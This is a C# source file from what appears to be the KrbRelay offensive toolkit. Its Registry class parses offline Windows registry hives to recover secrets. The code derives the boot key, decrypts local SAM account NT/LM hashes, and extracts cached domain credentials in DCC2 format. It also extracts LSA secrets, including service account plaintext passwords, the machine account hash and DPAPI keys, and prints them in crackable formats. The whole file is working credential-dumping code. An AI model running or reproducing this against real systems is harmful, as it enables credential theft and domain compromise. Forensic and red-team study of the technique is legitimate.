using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace KrbRelay.HiveParser
{
    public class Registry
    {
        private static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                .Where(x => x % 2 == 0)
                .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                .ToArray();
        }

        public static byte[] GetBootKey(RegistryHive systemHive)
        {
            ValueKey controlSet = GetValueKey(systemHive, "Select\\Default");
            int cs = BitConverter.ToInt32(controlSet.Data, 0);

            StringBuilder scrambledKey = new StringBuilder();
            foreach (string key in new string[] { "JD", "Skew1", "GBG", "Data" })
            {
                NodeKey nk = GetNodeKey(systemHive, "ControlSet00" + cs + "\\Control\\Lsa\\" + key);

                for (int i = 0; i < nk.ClassnameLength && i < 8; i++)
                    scrambledKey.Append((char)nk.ClassnameData[i * 2]);
            }

            byte[] skey = StringToByteArray(scrambledKey.ToString());
            byte[] descramble = new byte[] { 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3,
                                             0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 };

            byte[] bootkey = new byte[16];
            for (int i = 0; i < bootkey.Length; i++)
                bootkey[i] = skey[descramble[i]];

            return bootkey;
        }

        private static byte[] GetHashedBootKey(byte[] bootKey, byte[] fVal)
        {
            byte[] domainData = fVal.Skip(104).ToArray();
            byte[] hashedBootKey;

            //old style hashed bootkey storage
            if (domainData[0].Equals(0x01))
            {
                byte[] f70 = fVal.Skip(112).Take(16).ToArray();
                List<byte> data = new List<byte>();
                data.AddRange(f70);
                data.AddRange(Encoding.ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"));
                data.AddRange(bootKey);
                data.AddRange(Encoding.ASCII.GetBytes("0123456789012345678901234567890123456789\0"));
                byte[] md5 = MD5.Create().ComputeHash(data.ToArray());
                byte[] f80 = fVal.Skip(128).Take(32).ToArray();
                hashedBootKey = Crypto.RC4Encrypt(md5, f80);
            }

            //new version of storage -- Win 2016 / Win 10 (potentially Win 2012) and above
            else if (domainData[0].Equals(0x02))
            {
                byte[] sk_Salt_AES = domainData.Skip(16).Take(16).ToArray();
                int sk_Data_Length = BitConverter.ToInt32(domainData, 12);
                // int offset = BitConverter.ToInt32(v,12) + 204;
                byte[] sk_Data_AES = domainData.Skip(32).Take(sk_Data_Length).ToArray();
                hashedBootKey = Crypto.DecryptAES_CBC(sk_Data_AES, bootKey, sk_Salt_AES);
            }
            else
            {
                Console.WriteLine("[-] Error parsing hashed bootkey");
                return null;
            }
            return hashedBootKey;
        }

        public static List<string> ParseSam(byte[] bootKey, RegistryHive sam)
        {
            List<string> retVal = new List<string>
            {
                "[*] SAM hashes"
            };
            try
            {
                NodeKey nk = GetNodeKey(sam, @"SAM\Domains\Account");
                byte[] fVal = nk.getChildValues("F");
                byte[] hashedBootKey = GetHashedBootKey(bootKey, fVal);
                NodeKey targetNode = nk.ChildNodes.Find(x => x.Name.Contains("Users"));
                byte[] antpassword = Encoding.ASCII.GetBytes("NTPASSWORD\0");
                byte[] almpassword = Encoding.ASCII.GetBytes("LMPASSWORD\0");
                foreach (NodeKey user in targetNode.ChildNodes.Where(x => x.Name.Contains("00000")))
                {
                    byte[] rid = BitConverter.GetBytes(System.Int32.Parse(user.Name, System.Globalization.NumberStyles.HexNumber));
                    byte[] v = user.getChildValues("V");
                    int offset = BitConverter.ToInt32(v, 12) + 204;
                    int length = BitConverter.ToInt32(v, 16);
                    string username = Encoding.Unicode.GetString(v.Skip(offset).Take(length).ToArray());

                    //there are 204 bytes of headers / flags prior to data in the encrypted key data structure
                    int lmHashOffset = BitConverter.ToInt32(v, 156) + 204;
                    int lmHashLength = BitConverter.ToInt32(v, 160);
                    int ntHashOffset = BitConverter.ToInt32(v, 168) + 204;
                    int ntHashLength = BitConverter.ToInt32(v, 172);
                    string lmHash = "aad3b435b51404eeaad3b435b51404ee";
                    string ntHash = "31d6cfe0d16ae931b73c59d7e0c089c0";

                    //old style hashes
                    if (v[ntHashOffset + 2].Equals(0x01))
                    {
                        IEnumerable<byte> lmKeyParts = hashedBootKey.Take(16).ToArray().Concat(rid).Concat(almpassword);
                        byte[] lmHashDecryptionKey = MD5.Create().ComputeHash(lmKeyParts.ToArray());
                        IEnumerable<byte> ntKeyParts = hashedBootKey.Take(16).ToArray().Concat(rid).Concat(antpassword);
                        byte[] ntHashDecryptionKey = MD5.Create().ComputeHash(ntKeyParts.ToArray());
                        byte[] encryptedLmHash = null;
                        byte[] encryptedNtHash = null;

                        if (ntHashLength == 20)
                        {
                            encryptedNtHash = v.Skip(ntHashOffset + 4).Take(16).ToArray();
                            byte[] obfuscatedNtHashTESTING = Crypto.RC4Encrypt(ntHashDecryptionKey, encryptedNtHash);
                            ntHash = Crypto.DecryptSingleHash(obfuscatedNtHashTESTING, user.Name).Replace("-", "");
                        }
                        if (lmHashLength == 20)
                        {
                            encryptedLmHash = v.Skip(lmHashOffset + 4).Take(16).ToArray();
                            byte[] obfuscatedLmHashTESTING = Crypto.RC4Encrypt(lmHashDecryptionKey, encryptedLmHash);
                            lmHash = Crypto.DecryptSingleHash(obfuscatedLmHashTESTING, user.Name).Replace("-", "");
                        }
                    }
                    //new-style hashes
                    else
                    {
                        byte[] enc_LM_Hash = v.Skip(lmHashOffset).Take(lmHashLength).ToArray();
                        byte[] lmData = enc_LM_Hash.Skip(24).ToArray();
                        //if a hash exists, otherwise we have to return the default string val
                        if (lmData.Length > 0)
                        {
                            byte[] lmHashSalt = enc_LM_Hash.Skip(8).Take(16).ToArray();
                            byte[] desEncryptedHash = Crypto.DecryptAES_CBC(lmData, hashedBootKey.Take(16).ToArray(), lmHashSalt).Take(16).ToArray();
                            lmHash = Crypto.DecryptSingleHash(desEncryptedHash, user.Name).Replace("-", "");
                        }

                        byte[] enc_NT_Hash = v.Skip(ntHashOffset).Take(ntHashLength).ToArray();
                        byte[] ntData = enc_NT_Hash.Skip(24).ToArray();
                        //if a hash exists, otherwise we have to return the default string val
                        if (ntData.Length > 0)
                        {
                            byte[] ntHashSalt = enc_NT_Hash.Skip(8).Take(16).ToArray();
                            byte[] desEncryptedHash = Crypto.DecryptAES_CBC(ntData, hashedBootKey.Take(16).ToArray(), ntHashSalt).Take(16).ToArray();
                            ntHash = Crypto.DecryptSingleHash(desEncryptedHash, user.Name).Replace("-", "");
                        }
                    }
                    string ridStr = System.Int32.Parse(user.Name, System.Globalization.NumberStyles.HexNumber).ToString();
                    string hashes = (lmHash + ":" + ntHash);
                    retVal.Add(string.Format("{0}:{1}:{2}", username, ridStr, hashes.ToLower()));
                }
            }
            catch (Exception e)
            {
                retVal.Add("[-] Error parsing SAM dump file: " + e.ToString());
            }
            return retVal;
        }

        public static List<string> ParseLsa(RegistryHive security, byte[] bootKey, RegistryHive system)
        {
            List<string> retVal = new List<string>();
            try
            {
                byte[] fVal = GetValueKey(security, @"Policy\PolEKList\Default").Data;
                LsaSecret record = new LsaSecret(fVal);
                byte[] dataVal = record.data.Take(32).ToArray();
                byte[] tempKey = Crypto.ComputeSha256(bootKey, dataVal);
                byte[] dataVal2 = record.data.Skip(32).Take(record.data.Length - 32).ToArray();
                byte[] decryptedLsaKey = Crypto.DecryptAES_ECB(dataVal2, tempKey).Skip(68).Take(32).ToArray();

                //get NLKM Secret
                byte[] nlkmKey = null;
                NodeKey nlkm = GetNodeKey(security, @"Policy\Secrets\NL$KM");
                if (nlkm != null)
                {
                    retVal.Add("[*] Cached domain logon information(domain/username:hash)");
                    nlkmKey = DumpSecret(nlkm, decryptedLsaKey);
                    foreach (ValueKey cachedLogin in GetNodeKey(security, @"Cache").ChildValues)
                    {
                        if (string.Compare(cachedLogin.Name, "NL$Control", StringComparison.OrdinalIgnoreCase) != 0 && !IsZeroes(cachedLogin.Data.Take(16).ToArray()))
                        {
                            NL_Record cachedUser = new NL_Record(cachedLogin.Data);
                            byte[] plaintext = Crypto.DecryptAES_CBC(cachedUser.encryptedData, nlkmKey.Skip(16).Take(16).ToArray(), cachedUser.IV);
                            byte[] hashedPW = plaintext.Take(16).ToArray();
                            string username = Encoding.Unicode.GetString(plaintext.Skip(72).Take(cachedUser.userLength).ToArray());
                            string domain = Encoding.Unicode.GetString(plaintext.Skip(72 + Pad(cachedUser.userLength) + Pad(cachedUser.domainNameLength)).Take(Pad(cachedUser.dnsDomainLength)).ToArray());
                            domain = domain.Replace("\0", "");
                            retVal.Add(string.Format("{0}/{1}:$DCC2$10240#{2}#{3}", domain, username, username, BitConverter.ToString(hashedPW).Replace("-", "").ToLower()));
                        }
                    }
                }

                try
                {
                    retVal.Add("[*] LSA Secrets");
                    foreach (NodeKey secret in GetNodeKey(security, @"Policy\Secrets").ChildNodes)
                    {
                        if (string.Compare(secret.Name, "NL$Control", StringComparison.OrdinalIgnoreCase) != 0)
                        {
                            if (string.Compare(secret.Name, "NL$KM", StringComparison.OrdinalIgnoreCase) != 0)
                            {
                                LsaSecretBlob secretBlob = new LsaSecretBlob(DumpSecret(secret, decryptedLsaKey));
                                if (secretBlob.length > 0)
                                {
                                    retVal.Add(PrintSecret(secret.Name, secretBlob, system));
                                }
                            }
                            else
                            {
                                LsaSecretBlob secretBlob = new LsaSecretBlob(nlkmKey);
                                if (secretBlob.length > 0)
                                {
                                    retVal.Add(PrintSecret(secret.Name, secretBlob, system));
                                }
                            }
                        }
                    }
                }
                catch
                {
                    retVal.Add("[-] No secrets to parse");
                }
            }
            catch (Exception e)
            {
                retVal.Add("[-] Error parsing SECURITY dump file: " + e.ToString());
            }
            return retVal;
        }

        private static int Pad(int data)
        {
            if ((data & 0x3) > 0)
            {
                return (data + (data & 0x3));
            }
            else
            {
                return data;
            }
        }

        private static bool IsZeroes(byte[] inputArray)
        {
            foreach (byte b in inputArray)
            {
                if (b != 0x00)
                {
                    return false;
                }
            }
            return true;
        }

        private static string PrintSecret(string keyName, LsaSecretBlob secretBlob, RegistryHive system)
        {
            string secretOutput = string.Format("[*] {0}\r\n", keyName);

            if (keyName.ToUpper().StartsWith("_SC_"))
            {
                ValueKey startName = GetValueKey(system, string.Format(@"ControlSet001\Services\{0}\ObjectName", keyName.Substring(4)));
                string pw = Encoding.Unicode.GetString(secretBlob.secret.ToArray());
                secretOutput += string.Format("{0}:{1}", Encoding.UTF8.GetString(startName.Data), pw);
            }
            else if (keyName.ToUpper().StartsWith("$MACHINE.ACC"))
            {
                string computerAcctHash = BitConverter.ToString(Crypto.Md4Hash2(secretBlob.secret)).Replace("-", "").ToLower();
                ValueKey domainName = GetValueKey(system, @"ControlSet001\Services\Tcpip\Parameters\Domain");
                ValueKey computerName = GetValueKey(system, @"ControlSet001\Services\Tcpip\Parameters\Hostname");
                secretOutput += string.Format("{0}\\{1}$:aad3b435b51404eeaad3b435b51404ee:{2}", Encoding.UTF8.GetString(domainName.Data), Encoding.UTF8.GetString(computerName.Data), computerAcctHash);
            }
            else if (keyName.ToUpper().StartsWith("DPAPI"))
            {
                secretOutput += ("dpapi_machinekey:" + BitConverter.ToString(secretBlob.secret.Skip(4).Take(20).ToArray()).Replace("-", "").ToLower() + "\r\n");
                secretOutput += ("dpapi_userkey:" + BitConverter.ToString(secretBlob.secret.Skip(24).Take(20).ToArray()).Replace("-", "").ToLower());
            }
            else if (keyName.ToUpper().StartsWith("NL$KM"))
            {
                secretOutput += ("NL$KM:" + BitConverter.ToString(secretBlob.secret).Replace("-", "").ToLower());
            }
            else if (keyName.ToUpper().StartsWith("ASPNET_WP_PASSWORD"))
            {
                secretOutput += ("ASPNET:" + System.Text.Encoding.Unicode.GetString(secretBlob.secret));
            }
            else
            {
                secretOutput += ("[!] Secret type not supported yet - outputing raw secret as unicode:\r\n");
                secretOutput += (System.Text.Encoding.Unicode.GetString(secretBlob.secret));
            }
            return secretOutput;
        }

        private static byte[] DumpSecret(NodeKey secret, byte[] lsaKey)
        {
            NodeKey secretCurrVal = secret.ChildNodes.Find(x => x.Name.Contains("CurrVal"));
            byte[] value = secretCurrVal.getChildValues("Default");
            LsaSecret record = new LsaSecret(value);
            byte[] tempKey = Crypto.ComputeSha256(lsaKey, record.data.Take(32).ToArray());
            byte[] dataVal2 = record.data.Skip(32).Take(record.data.Length - 32).ToArray();
            byte[] plaintext = Crypto.DecryptAES_ECB(dataVal2, tempKey);

            return (plaintext);
        }

        private static NodeKey GetNodeKey(RegistryHive hive, string path)
        {
            NodeKey node = null;
            string[] paths = path.Split('\\');

            foreach (string ch in paths)
            {
                bool found = false;
                if (node == null)
                    node = hive.RootKey;

                foreach (NodeKey child in node.ChildNodes)
                {
                    if (child.Name == ch)
                    {
                        node = child;
                        found = true;
                        break;
                    }
                }
                if (found == false)
                {
                    return null;
                }
            }
            return node;
        }

        public static ValueKey GetValueKey(RegistryHive hive, string path)
        {
            string keyname = path.Split('\\').Last();
            path = path.Substring(0, path.LastIndexOf('\\'));

            NodeKey node = GetNodeKey(hive, path);

            return node.ChildValues.SingleOrDefault(v => v.Name == keyname);
        }
    }
}